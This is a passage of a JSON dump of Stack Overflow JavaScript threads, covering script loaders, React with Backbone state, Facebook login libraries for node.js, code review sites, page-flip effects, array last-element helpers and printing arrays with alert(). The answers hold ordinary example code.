content, RequireJS or Yepnope will serve you well.</p>\n",
                    "is_accepted": false,
                    "score": 27
                }
            ],
            "body": "<p>I need to be able to use a module loader for js and css files.   </p>\n\n<p>I found some of the these module loader which are:</p>\n\n<ul>\n<li>YepNope: <a href=\"http://yepnopejs.com/\">http://yepnopejs.com/</a></li>\n<li>RequireJs <a href=\"http://requirejs.org/\">http://requirejs.org/</a></li>\n<li>LABjs: <a href=\"https://github.com/getify/LABjs\">https://github.com/getify/LABjs</a></li>\n<li>headjs: <a href=\"https://github.com/headjs/headjs\">https://github.com/headjs/headjs</a></li>\n</ul>\n\n<p>My main requirements are:<br>\n1) use a js/ccs module loader which is able to load different css/js modules\n according to the device used to access the web app.<br>\n2) get a js/ccs module loader which is likely to be the faster in most cases.</p>\n\n<p>My question is:<br>\nin your opinion what is the \"module loader\" which fits better my requirements? </p>\n",
            "last_activity_date": 1382693168,
            "question_id": 12779565,
            "score": 31,
            "tags": [
                "javascript",
                "requirejs",
                "yepnope",
                "labjs"
            ],
            "title": "Comparing popular script loaders - YepNope, RequireJS, LabJS and HeadJS"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Until there is a better answer, let me <a href=\"https://groups.google.com/forum/#!msg/reactjs/lT2pOKXUHY8/DVKtGyU2pfgJ\">quote</a> <a href=\"http://www.petehunt.net\">Pete Hunt</a>, a core React developer:</p>\n\n<blockquote>\n  <p>The big win with Backbone models was it managed your data flow for you. When you called <code>set()</code> it would inform your app that data changed. <strong>With React you'll find this to be less necessary because all you need to do is inform the component that owns the state via a callback and React ensures that all children are up-to-date.</strong> So this part of backbone is less useful IMO (and people tend to use backbone in this way with React anyway).</p>\n  \n  <p>You don't have to pass pure JSON (though that's what I tend to do and it works well for simple data models), but you will see lots of advantages if you keep your objects immutable.</p>\n  \n  <p><strong>You can try this out by just calling <code>toJSON()</code> on your backbone models and seeing how you like it vs passing the models around.</strong></p>\n</blockquote>\n\n<p>(emphasis mine)</p>\n\n<p>Interestingly, <a href=\"https://github.com/magalhas/backbone-react-component/blob/master/lib/component.js\">Backbone.React.Component</a> is the only example I found that uses <code>toJSON</code>, but for some reason also uses <code>setProps</code> instead of <code>setState</code> (which is <a href=\"http://facebook.github.io/react/docs/component-api.html#setprops\">discouraged too</a>).</p>\n\n<h2>Update</h2>\n\n<p>I made a simple mixin based on Pete Hunt's approach (no <code>setProps</code>, no <code>forceUpdate</code>):</p>\n\n<pre><code>define(function () {\n\n  'use strict';\n\n  var Backbone = require('backbone'),\n      _ = require('underscore');\n\n  var BackboneStateMixin = {\n    getInitialState: function () {\n      return this.getBackboneState(this.props);\n    },\n\n    componentDidMount: function () {\n      if (!_.isFunction(this.getBackboneState)) {\n        throw new Error('You must provide getBackboneState(props).');\n      }\n\n      this._bindBackboneEvents(this.props);\n    },\n\n    componentWillReceiveProps: function (newProps) {\n      this._unbindBackboneEvents();\n      this._bindBackboneEvents(newProps);\n    },\n\n    componentWillUnmount: function () {\n      this._unbindBackboneEvents();\n    },\n\n    _updateBackboneState: function () {\n      var state = this.getBackboneState(this.props);\n      this.setState(state);\n    },\n\n    _bindBackboneEvents: function (props) {\n      if (!_.isFunction(this.watchBackboneProps)) {\n        return;\n      }\n\n      if (this._backboneListener) {\n        throw new Error('Listener already exists.');\n      }\n\n      if (!props) {\n        throw new Error('Passed props are empty');\n      }\n\n      var listener = _.extend({}, Backbone.Events),\n          listenTo = _.partial(listener.listenTo.bind(listener), _, _, this._updateBackboneState);\n\n      this.watchBackboneProps(props, listenTo);\n      this._backboneListener = listener;\n    },\n\n    _unbindBackboneEvents: function () {\n      if (!_.isFunction(this.watchBackboneProps)) {\n        return;\n      }\n\n      if (!this._backboneListener) {\n        throw new Error('Listener does not exist.');\n      }\n\n      this._backboneListener.stopListening();\n      delete this._backboneListener;\n    }\n  };\n\n  return BackboneStateMixin;\n\n});\n</code></pre>\n\n<p>It doesn't care about what kind of models or collections you have.  </p>\n\n<p>The convention is that <strong>Backbone models go in <code>props</code> and their JSON is automatically put by mixin into <code>state</code></strong>. You need to override <code>getBackboneState(props)</code> for this to work, and optionally <code>watchBackboneProps</code> to tell the mixin when to call <code>setState</code> with fresh values.</p>\n\n<p>Usage example:</p>\n\n<pre><code>var InfoWidget = React.createClass({\n  mixins: [BackboneStateMixin, PopoverMixin],\n\n  propTypes: {\n    stampModel: React.PropTypes.instanceOf(Stamp).isRequired\n  },\n\n  // Override getBackboneState to tell the mixin\n  // HOW to transform Backbone props into JSON state\n\n  getBackboneState: function (props) {\n    var stampModel = props.stampModel,\n        primaryZineModel = stampModel.getPrimaryZine();\n\n    return {\n      stamp: stampModel.toJSON(),\n      toggleIsLiked: stampModel.toggleIsLiked.bind(stampModel),\n      primaryZine: primaryZineModel &amp;&amp; primaryZineModel.toJSON()\n    };\n  },\n\n  // Optionally override watchBackboneProps to tell the mixin\n  // WHEN to transform Backbone props into JSON state\n\n  watchBackboneProps: function (props, listenTo) {\n    listenTo(props.stampModel, 'change:unauth_like_count change:is_liked');\n    listenTo(props.stampModel.get('zines'), 'all');\n  },\n\n  render: function () {\n    // You can use vanilla JSON values of this.state.stamp,\n    // this.state.toggleIsLiked and this.state.primaryZine\n    // or whatever you return from getBackboneState\n    // without worrying they may point to old values\n  }\n}\n</code></pre>\n\n<p>Note: mixin requires Underscore 1.6.0+.</p>\n",
                    "is_accepted": false,
                    "score": 12
                },
                {
                    "body": "<p>Pete's answer is great.</p>\n\n<p>Backbone models are inherently mutative, which (while not a problem in itself) means that when rerendering, you won't have the old version of the model to compare to. This makes it harder to do intelligent optimizations by defining <a href=\"http://facebook.github.io/react/docs/component-specs.html#updating-shouldcomponentupdate\"><code>shouldComponentUpdate</code></a> methods in key places on your components. (You also lose out on the ability to easily store old versions of your model for other reasons, like <a href=\"http://swannodette.github.io/2013/12/31/time-travel/\">implementing undo</a>.)</p>\n\n<p>Calling <code>forceUpdate</code> merely skips <code>shouldComponentUpdate</code> and forces the component to rerender. Note that calling <code>render</code> is usually cheap, and React will still only touch the DOM if the output of <code>render</code> has changed, so performance problems here aren't common. However, if you have the choice to use immutable data (including passing around raw model property objects from <code>toJSON()</code> as Pete suggests), I'd highly recommend it.</p>\n",
                    "is_accepted": true,
                    "score": 7
                },
                {
                    "body": "<p>I'm the developer behind Backbone.React.Component. The reason why we're using setProps is because this is only intended to be called by the component owner (greatest parent). The way I see it, props is better to use for reactive updates (and to pass to child components) than state, but if you can point me some reasons why state is better I'll be happy to start developing towards that change.</p>\n\n<p>For instance sometimes I've got components that delegate to others, where transferPropsTo is pretty handy. Using state kind of makes it harder to achieve that.</p>\n",
                    "is_accepted": false,
                    "score": 4
                }
            ],
            "body": "<p><a href=\"http://facebook.github.io/react/\">Facebook React</a> <a href=\"http://facebook.github.io/react/docs/interactivity-and-dynamic-uis.html#what-components-should-have-state\">encourages</a> you to separate mutable (<code>state</code>) and immutable (<code>props</code>) state:</p>\n\n<blockquote>\n  <p>Try to keep as many of your components as possible stateless. By doing this you'll isolate the state to its most logical place and minimize redundancy, making it easier to reason about your application.</p>\n</blockquote>\n\n<p>When the state changes, you are supposed to call <a href=\"http://facebook.github.io/react/docs/component-api.html#setprops\"><code>setState</code></a> to trigger virtual DOM diff, which will cause a real DOM update only when this is needed.</p>\n\n<p>There <em>is</em> a way to trigger DOM update manually by calling <a href=\"http://facebook.github.io/react/docs/component-api.html#forceupdate\"><code>forceUpdate</code></a> but it is <a href=\"http://facebook.github.io/react/docs/component-api.html#forceupdate\">discouraged</a>:</p>\n\n<blockquote>\n  <p>Normally <strong>you should try to avoid all uses of <code>forceUpdate()</code></strong> and only read from <code>this.props</code> and <code>this.state</code> in <code>render()</code>. This makes your application much simpler and more efficient.</p>\n</blockquote>\n\n<p>However, all React+Backbone examples I have seen <strong>ignore this advice</strong> and store models and collections in <code>props</code> and call <code>forceUpdate</code>:</p>\n\n<ul>\n<li><a href=\"http://www.thomasboyt.com/2013/12/17/using-reactjs-as-a-backbone-view.html\">http://www.thomasboyt.com/2013/12/17/using-reactjs-as-a-backbone-view.html</a></li>\n<li><a href=\"https://github.com/usepropeller/react.backbone/blob/master/react.backbone.js\">https://github.com/usepropeller/react.backbone/blob/master/react.backbone.js</a></li>\n<li><a href=\"https://gist.github.com/ssorallen/7883081\">https://gist.github.com/ssorallen/7883081</a></li>\n<li><a href=\"http://eldar.djafarov.com/2013/11/reactjs-mixing-with-backbone/\">http://eldar.djafarov.com/2013/11/reactjs-mixing-with-backbone/</a></li>\n</ul>\n\n<p>Even React's own example uses <code>forceUpdate</code>:</p>\n\n<ul>\n<li><a href=\"https://github.com/facebook/react/blob/master/examples/todomvc-backbone/js/app.js#L148\">https://github.com/facebook/react/blob/master/examples/todomvc-backbone/js/app.js#L148</a></li>\n</ul>\n\n<p>Is there a better way, though, and what benefits would it give?</p>\n",
            "last_activity_date": 1392996150,
            "question_id": 21709905,
            "score": 21,
            "tags": [
                "javascript",
                "backbone.js",
                "reactjs"
            ],
            "title": "Can I avoid forceUpdate() when using React with Backbone?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Did you not find ciaranj's <a href=\"https://github.com/ciaranj/connect-auth\">connect-auth</a></p>\n\n<pre><code>const fbId = \"\"; #x\nconst fbSecret = \"\"; #y\nconst fbCallbackAddress= \"http://localhost:4000/auth/facebook\";\n//var RedisStore = require('connect-redis');\nvar express= require('express');\nvar auth= require('connect-auth')\nvar app = express.createServer();\napp.configure(function(){\n  app.use(express.cookieDecoder());\n  app.use(express.logger());\n  //app.use(connect.session({ store: new RedisStore({ maxAge: 10080000 }) }));\n  app.use(express.session());\n  app.use(auth( [\n    auth.Facebook({appId : fbId, appSecret: fbSecret, scope: \"email\", callback: fbCallbackAddress})\n  ]) );\n});\n\n\napp.get('/logout', function(req, res, params) {\n    req.logout();\n    res.writeHead(303, { 'Location': \"/\" });\n    res.end('');\n});\n\napp.get('/', function(req, res, params) {\n    if( !req.isAuthenticated() ) {\n        res.send('&lt;html&gt;                                              \\n\\\n          &lt;head&gt;                                             \\n\\\n            &lt;title&gt;connect Auth -- Not Authenticated&lt;/title&gt; \\n\\\n            &lt;script src=\"http://static.ak.fbcdn.net/connect/en_US/core.js\"&gt;&lt;/script&gt; \\n\\\n          &lt;/head&gt;&lt;body&gt;                                             \\n\\\n            &lt;div id=\"wrapper\"&gt;                               \\n\\\n              &lt;h1&gt;Not authenticated&lt;/h1&gt;                     \\n\\\n              &lt;div class=\"fb_button\" id=\"fb-login\" style=\"float:left; background-position: left -188px\"&gt;          \\n\\\n                &lt;a href=\"/auth/facebook\" class=\"fb_button_medium\"&gt;        \\n\\\n                  &lt;span id=\"fb_login_text\" class=\"fb_button_text\"&gt; \\n\\\n                    Connect with Facebook                    \\n\\\n                  &lt;/span&gt;                                    \\n\\\n                &lt;/a&gt;                                         \\n\\\n              &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;');\n    } else {\n         res.send( JSON.stringify( req.getAuthDetails()) );\n    }\n});\n\n// Method to handle a sign-in with a specified method type, and a url to go back to ...\napp.get('/auth/facebook', function(req,res) {\n  req.authenticate(['facebook'], function(error, authenticated) { \n     if(authenticated ) {\n        res.send(\"&lt;html&gt;&lt;h1&gt;Hello Facebook user:\" + JSON.stringify( req.getAuthDetails() ) + \".&lt;/h1&gt;&lt;/html&gt;\")\n      }\n      else {\n        res.send(\"&lt;html&gt;&lt;h1&gt;Facebook authentication failed :( &lt;/h1&gt;&lt;/html&gt;\")\n      }\n   });\n});\n</code></pre>\n\n<p>app.listen(4000);</p>\n\n<p><img src=\"http://i.stack.imgur.com/X2oE1.png\" alt=\"facebook settings\"></p>\n",
                    "is_accepted": true,
                    "score": 17
                },
                {
                    "body": "<p>I have used Brian Noguchi's everyauth. It works w/ node.js v.0.4.x. You can find that <a href=\"https://github.com/bnoguchi/everyauth\" rel=\"nofollow\">here</a>. </p>\n\n<p>It has native support for mongodb using <a href=\"https://github.com/bnoguchi/mongoose-auth\" rel=\"nofollow\">mongoose-auth</a> plugin, again written by brian.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I find <a href=\"https://github.com/jaredhanson/passport-facebook\">passport-facebook</a> fairly simple and useful.<br>\nI also like that the core passport module has 80+ auth strategies.<br>\n(e.g. twitter, google, foursquare, github, digg, dropbox).</p>\n\n<p>From the creator's github README:</p>\n\n<pre><code>// Set up the strategy\npassport.use(new FacebookStrategy({\n        clientID: FACEBOOK_APP_ID,\n        clientSecret: FACEBOOK_APP_SECRET,\n        callbackURL: \"http://localhost:3000/auth/facebook/callback\"\n    },\n    function(accessToken, refreshToken, profile, done) {\n        User.findOrCreate({ facebookId: profile.id }, function (err, user) {\n            return done(err, user);\n        });\n    }\n));\n\n// Use the authentication\napp.get('/auth/facebook',\n    passport.authenticate('facebook'),\n    function(req, res){\n        // The request will be redirected to Facebook for authentication, so\n        // this function will not be called.\n});\n\napp.get('/auth/facebook/callback',\n    passport.authenticate('facebook', { failureRedirect: '/login' }),\n    function(req, res) {\n        // Successful authentication, redirect home.\n        res.redirect('/');\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 7
                }
            ],
            "body": "<p>I've seen multiple tools for working with node.js and facebook connect.  However many of them seem incomplete, overly-complex (non abstract) or no longer updated/maintained.</p>\n\n<p>I've found these three projects:</p>\n\n<p><a href=\"https://github.com/DracoBlue/node-facebook-client\">https://github.com/DracoBlue/node-facebook-client</a></p>\n\n<p><a href=\"https://github.com/dominiek/node-facebook\">https://github.com/dominiek/node-facebook</a></p>\n\n<p><a href=\"https://github.com/egorFiNE/facebook-connect\">https://github.com/egorFiNE/facebook-connect</a></p>\n\n<p><a href=\"https://github.com/ciaranj/node-oauth\">https://github.com/ciaranj/node-oauth</a></p>\n\n<p>Here one of the authors even discusses why he once again rolled his own, due to shortcomings in other implementations:</p>\n\n<p><a href=\"http://groups.google.com/group/nodejs/browse_thread/thread/bb46cb08e51fdda6\">http://groups.google.com/group/nodejs/browse_thread/thread/bb46cb08e51fdda6</a></p>\n\n<p>Does anyone have any real experience actually authenticating users and storing their facebook id's in their database using node.js and facebook connect?</p>\n\n<p>I have a feeling that the answer is pretty much no and I'll have to build on top of one of the above systems to make things much simpler, but I wanted to check first.</p>\n\n<p>Edit: Note make sure you use the STABLE version of node.js</p>\n",
            "last_activity_date": 1360319037,
            "question_id": 4484825,
            "score": 20,
            "tags": [
                "javascript",
                "facebook",
                "node.js"
            ],
            "title": "What is the best facebook connect library for node.js?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p><a href=\"http://refactormycode.com\">Refactor My Code</a> comes to mind. </p>\n\n<p><a href=\"http://snipplr.com/\">Snipplr</a> is handy too, but is more like a web notebook rather than a dedicated code discussion site.</p>\n\n<p><a href=\"http://gist.github.com\">Gist</a> from the github folks is basically a versioned pastebin, which is pretty awesome in its own right, but again, more useful as a supplement to a discussion, rather than a discussion itself.</p>\n",
                    "is_accepted": true,
                    "score": 13
                },
                {
                    "body": "<p>Some have recommended <a href=\"http://www.refactormycode.com\" rel=\"nofollow\">www.refactormycode.com</a> in the past.  Their PHP section is a bit limited as of the last time I looked but it might not be a bad place to start.  </p>\n\n<p>Is there some specific information you were looking to obtain or just general improvements to what you have done?</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Well if you have a group you would be doing the review with, I would suggest looking into <a href=\"http://codereview.appspot.com/\">Rietveld</a>. It's a web application code review tool <a href=\"http://code.google.com/p/rietveld/wiki/CodeReviewBackground\">developed by</a> Google engineer and Python BDFL Guido van Rossum. However it requires the use of a hosted subversion trunk, but it's language agnostic. </p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p><a href=\"http://www.smartbear.com\" rel=\"nofollow\">Smartbear</a> offers a product called <a href=\"http://www.smartbear.com/codecollab.php\" rel=\"nofollow\">code collaborator</a>. It allows line-by-line critiques of files and ajax-style dyanmic updating, so you can actually hold a discussion in the code.</p>\n\n<p>We use it at my day job--very, very useful. It's <a href=\"http://www.smartbear.com/codecollab-buy.php\" rel=\"nofollow\">free for use with open source projects</a>, and I use it for those too.</p>\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<p>You might try comp.lang.javascript for code reviews. </p>\n\n<p>Make sure to post the code formatted properly and do familiarize yourself with Usenet posting style, briefly outlined here:\n<a href=\"http://jibbering.com/faq/#posting\" rel=\"nofollow\">http://jibbering.com/faq/#posting</a></p>\n\n<p>Before posting code for code review, it is recommended to read the Code Guidelines document:\n<a href=\"http://jibbering.com/faq/notes/code-guidelines/\" rel=\"nofollow\">http://jibbering.com/faq/notes/code-guidelines/</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>What are the best places for freelancers or small companies to get code reviewed for PHP and JavaScript? Forums are an option, but are there any sites dedicated specifically to code reviews? </p>\n\n<p>Edit: Just for clarification, I'm looking more for a website to get the code critiqued by others than a tool that helps perform internal code reviews. I do appreciate the responses that offered a tool, though, and will keep those in mind for future use.</p>\n",
            "last_activity_date": 1272861815,
            "question_id": 87896,
            "score": 19,
            "tags": [
                "php",
                "javascript",
                "code-review"
            ],
            "title": "Code reviews on the web for PHP and JavaScript code"
        },
        {
            "answer_count": 9,
            "answers": [
                {
                    "body": "<p>You can try <a href=\"http://www.jquery.info/scripts/jFlip/demo.html\" rel=\"nofollow\">jFlip</a>, it's a jQuery Plugin, It's not IE-compliant but I guess it's not a problem for you since you are asking for HTML5.</p>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>This is better done with SVG's <code>&lt;foreignObject&gt;</code> element and SVG transforms. <a href=\"http://starkravingfinkle.org/blog/2007/07/firefox-3-svg-foreignobject/\" rel=\"nofollow\">This blog post by Mark Finkle</a> has some info on rotating stuff as you would need to do in a \"page flip/turn\" effect. As far as I know, only Gecko 1.9+ and WebKit support this.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Hi guys you might have a look at another (nice one) implementation of HTML5-based page flipper: <a href=\"http://jpageflipper.codeplex.com/\" rel=\"nofollow\">http://jpageflipper.codeplex.com/</a></p>\n\n<p>It's really nice and it's implemented as a jQuery plugin</p>\n",
                    "is_accepted": true,
                    "score": 16
                },
                {
                    "body": "<p>Here is an HTML5 Page flip App that I built using HTML5's Canvas Element &amp; jQuery. It's called <a href=\"http://10k.aneventapart.com/Entry/325/\" rel=\"nofollow\">RectoVerso</a>.</p>\n\n<p>I also ran across this one: <a href=\"http://romancortes.com/ficheros/page-flip.html\" rel=\"nofollow\">http://romancortes.com/ficheros/page-flip.html</a><br>\nWhich is done with only CSS3. </p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p><a href=\"http://www.romancortes.com/blog/pure-css3-page-flip-effect/\" rel=\"nofollow\">http://www.romancortes.com/blog/pure-css3-page-flip-effect/</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p><a href=\"http://js1k.com/2010-first/demo/441\" rel=\"nofollow\">http://js1k.com/2010-first/demo/441</a> <br />\nAs compact as possible :D</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>see this <a href=\"http://www.20thingsilearned.com/home\" rel=\"nofollow\">http://www.20thingsilearned.com/home</a></p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>There is a clear and informative <a href=\"http://www.html5rocks.com/en/tutorials/casestudies/20things_pageflip.html\" rel=\"nofollow\">case study</a> about creating your own page flip effect based on the one in the <a href=\"http://www.20thingsilearned.com/en-US/home\" rel=\"nofollow\">20 Things I Learned About Browsers and the Web</a> book that Narendrakumar linked to. It\u2019s a great implementation to imitate, the case study is clear with relevant code samples, and it was written by a senior interactive developer for Fi, the company who developed the book.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>This one is a jquery plugin and pretty nifty</p>\n\n<p><a href=\"http://www.turnjs.com/#home\">http://www.turnjs.com/#home</a></p>\n",
                    "is_accepted": false,
                    "score": 7
                }
            ],
            "body": "<p>Has anyone tried recreating the page flip effect with images like you commonly see in Adobe Flash with JavaScript and HTML 5's canvas tag?</p>\n\n<p>Are there any frameworks or JQuery plug-ins that do this type of effect?</p>\n\n<p>The page flip in Flash allows you to grab a corner of the simulated book page and flip the page like you would flip a real book's page.</p>\n\n<p>I really want to learn how to do this with JavaScript and HTML 5's canvas tag, but not sure where to start nor what formulas would be necessary.</p>\n\n<p><a href=\"http://www.actionscript.org/showMovie.php?id=459\">Example page flip in flash</a></p>\n",
            "last_activity_date": 1395919851,
            "question_id": 1835321,
            "score": 16,
            "tags": [
                "javascript",
                "html5",
                "canvas"
            ],
            "title": "How to do a JavaScript HTML 5 Canvas image &quot;page flip&quot; like you commonly see in Flash?"
        },
        {
            "answer_count": 10,
            "answers": [
                {
                    "body": "<p>It's easy to define one yourself. That's the power of JavaScript.</p>\n\n<pre><code>if(!Array.prototype.last) {\n    Array.prototype.last = function() {\n        return this[this.length - 1];\n    }\n}\n\nvar arr = [1, 2, 5];\narr.last(); // 5\n</code></pre>\n\n<p>Or if you are not bound with browser support problems, then use the new ES5 syntax to <a href=\"http://ejohn.org/blog/ecmascript-5-objects-and-properties/\">define properties</a>. Chrome and Firefox nightly only at the moment.</p>\n\n<pre><code>Object.defineProperty(Array.prototype, 'last', {\n    enumerable: false,\n    configurable: true,\n    get: function() {\n        return this[this.length - 1];\n    },\n    set: undefined\n});\n\nvar arr = [1, 2, 5];\narr.last; // 5\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 73
                },
                {
                    "body": "<p>Because Javascript changes very slowly. And that's because people upgrade browsers slowly.</p>\n\n<p>Many Javascript libraries implement their own <code>last()</code> function. Use one!</p>\n",
                    "is_accepted": true,
                    "score": 36
                },
                {
                    "body": "<pre><code>Array.prototype.last = Array.prototype.last || function() {\n    var l = this.length;\n    return this[l-1];\n}\n\nx = [1,2];\nalert( x.last() )\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>You can do something like this:</p>\n\n<pre><code>[10, 20, 30, 40].slice(-1)[0]\n</code></pre>\n\n<p>The amount of helper methods that can be added to a language is infinite. I suppose they just haven't considered adding this one.</p>\n",
                    "is_accepted": false,
                    "score": 251
                },
                {
                    "body": "<p>Came here looking for an answer to this question myself. The slice answer is probably best, but I went ahead and created a \"last\" function just to practice extending prototypes, so I thought I would go ahead and share it. It has the added benefit over some other ones of letting you optionally count backwards through the array, and pull out, say, the second to last or third to last item. If you don't specify a count it just defaults to 1 and pulls out the last item.</p>\n\n<pre><code>Array.prototype.last = Array.prototype.last || function(count) {\n    count = count || 1;\n    var length = this.length;\n    if (count &lt;= length) {\n        return this[length - count];\n    } else {\n        return null;\n    }\n};\n\nvar arr = [1, 2, 3, 4, 5, 6, 7, 8, 9];\narr.last(); // returns 9\narr.last(4); // returns 6\narr.last(9); // returns 1\narr.last(10); // returns null\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p><code>i = [].concat(loves).pop(); //corn</code> </p>\n\n<p>icon cat loves popcorn</p>\n",
                    "is_accepted": false,
                    "score": 27
                },
                {
                    "body": "<p>Here is another simpler way to slice last elements</p>\n\n<pre><code> var tags = [1, 2, 3, \"foo\", \"bar\", \"foobar\", \"barfoo\"];\n var lastObj = tags.slice(-1);\n</code></pre>\n\n<p><code>lastObj</code> is now <code>[\"barfoo\"]</code>.</p>\n\n<p>Python does this the same way and when I tried using JS it worked out. I am guessing string manipulation in scripting languages work the same way.</p>\n\n<p>Similarly, if you want the last two objects in a array,</p>\n\n<pre><code>var lastTwoObj = tags.slice(-2)\n</code></pre>\n\n<p>will give you <code>[\"foobar\", \"barfoo\"]</code> and so on.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Another option, especially if you're already using UnderscoreJS, would be:</p>\n\n<pre><code>_.last([1, 2, 3, 4]); // Will return 4\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 11
                },
                {
                    "body": "<p><code>pop()</code> method will pop the last value out. But the problem is that you will lose the last value in the array</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Yeah, or just: </p>\n\n<pre><code>var arr = [1, 2, 5];\narr.reverse()[0]\n</code></pre>\n\n<p>if you want the value, and not a new list.</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>Its kinda weird that the JavaScript Array class does not offer a last method to retrieve the last element of an array. I know the solution is simple (Ar[Ar.length-1] ), but, still, this is too frequently used.</p>\n\n<p>Any serious reasons why this is not incorporated yet? </p>\n",
            "last_activity_date": 1376084991,
            "question_id": 3235043,
            "score": 117,
            "tags": [
                "javascript",
                "javascript-library"
            ],
            "title": "Why doesn&#39;t JavaScript have a last method?"
        },
        {
            "answer_count": 10,
            "answers": [
                {
                    "body": "<p>A very basic approach is <code>alert(arrayObj.join('\\n'))</code>, which will display each array element in a row.</p>\n",
                    "is_accepted": false,
                    "score": 92
                },
                {
                    "body": "<p>If this is for debugging purposes, I would advise you use a JavaScript debugger such as <a href=\"http://getfirebug.com/\" rel=\"nofollow\">Firebug</a>. It will let you view the entire contents of arrays and much more, including modifying array entries and stepping through code.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>You could write a function that will convert and format this array as string. Even better: use <a href=\"http://getfirebug.com/\" rel=\"nofollow\">FireBug</a> for debugging instead of alerts.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p><b>EDIT:</b> Firefox and Google Chrome now have a built-in <code>JSON</code> object, so you can just say <code>alert(JSON.stringify(myArray))</code> without needing to use a jQuery plugin.  This is not part of the Javascript language spec, so you shouldn't rely on the <code>JSON</code> object being present in all browsers, but for debugging purposes it's incredibly useful.</p>\n\n<p>I tend to use the <a href=\"http://code.google.com/p/jquery-json/\">jQuery-json plugin</a> as follows:</p>\n\n<pre><code>alert( $.toJSON(myArray) );\n</code></pre>\n\n<p>This prints the array in a format like</p>\n\n<pre><code>[5, 6, 7, 11]\n</code></pre>\n\n<p>However, for debugging your Javascript code, I <b>highly</b> recommend <a href=\"http://getfirebug.com/\">Firebug</a>  It actually comes with a Javascript console, so you can type out Javascript code for any page and see the results.  Things like arrays are already printed in the human-readable form used above.</p>\n\n<p>Firebug also has a debugger, as well as screens for helping you view and debug your HTML and CSS.</p>\n",
                    "is_accepted": false,
                    "score": 42
                },
                {
                    "body": "<p>pass  your js array to the function below and it will do the same as php print_r() function</p>\n\n<pre><code> alert(print_r(your array));  //call it like this\n\nfunction print_r(arr,level) {\nvar dumped_text = \"\";\nif(!level) level = 0;\n\n//The padding given at the beginning of the line.\nvar level_padding = \"\";\nfor(var j=0;j&lt;level+1;j++) level_padding += \"    \";\n\nif(typeof(arr) == 'object') { //Array/Hashes/Objects \n    for(var item in arr) {\n        var value = arr[item];\n\n        if(typeof(value) == 'object') { //If it is an array,\n            dumped_text += level_padding + \"'\" + item + \"' ...\\n\";\n            dumped_text += print_r(value,level+1);\n        } else {\n            dumped_text += level_padding + \"'\" + item + \"' =&gt; \\\"\" + value + \"\\\"\\n\";\n        }\n    }\n} else { //Stings/Chars/Numbers etc.\n    dumped_text = \"===&gt;\"+arr+\"&lt;===(\"+typeof(arr)+\")\";\n}\nreturn dumped_text;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 27
                },
                {
                    "body": "<p>You can use <code>alert(arrayObj.toSource());</code></p>\n",
                    "is_accepted": false,
                    "score": 13
                },
                {
                    "body": "<p>Better use Firebug (chrome console etc) and use console.dir()</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I'd recommend using toString().</p>\n\n<p>Ex. <code>alert(array.toString())</code>, or <code>console.log(array.toString())</code></p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<pre><code>alert($(\"#form_id\").serialize());\n</code></pre>\n",
                    "is_accepted": false,
                    "score": -3
                },
                {
                    "body": "<p>If what you want is to show with an alert() the content of an array of objects, i recomend you to define in the object the method toString() so with a simple alert(MyArray); the full content of the array will be shown in the alert.</p>\n\n<p>Here is an example:</p>\n\n<pre><code>//-------------------------------------------------------------------\n// Defininf the Point object\nfunction Point(CoordenadaX, CoordenadaY) {\n    // Sets the point coordinates depending on the parameters defined\n    switch (arguments.length) {\n        case 0:\n            this.x = null;\n            this.y = null;\n            break;\n        case 1:\n            this.x = CoordenadaX;\n            this.y = null;\n            break;\n        case 2:\n            this.x = CoordenadaX;\n            this.y = CoordenadaY;\n            break;\n    }\n    // This adds the toString Method to the point object so the \n    // point can be printed using alert();\n    this.toString = function() {\n        return \" (\" + this.x + \",\" + this.y + \") \";\n    };\n }\n</code></pre>\n\n<p>Then if you have an array of points:</p>\n\n<pre><code>var MyArray = [];\nMyArray.push ( new Point(5,6) );\nMyArray.push ( new Point(7,9) );\n</code></pre>\n\n<p>You can print simply calling:</p>\n\n<pre><code>alert(MyArray);\n</code></pre>\n\n<p>Hope this helps!</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>How can I view the structure of an array in javascript using <code>alert()</code>?</p>\n",
            "last_activity_date": 1382956505,
            "question_id": 3006644,
            "score": 76,
            "tags": [
                "javascript"
            ],
            "title": "How can I view array structure in javascript with alert()?"
        },
        {
            "answer_count": 6,
            "answers": [
                {
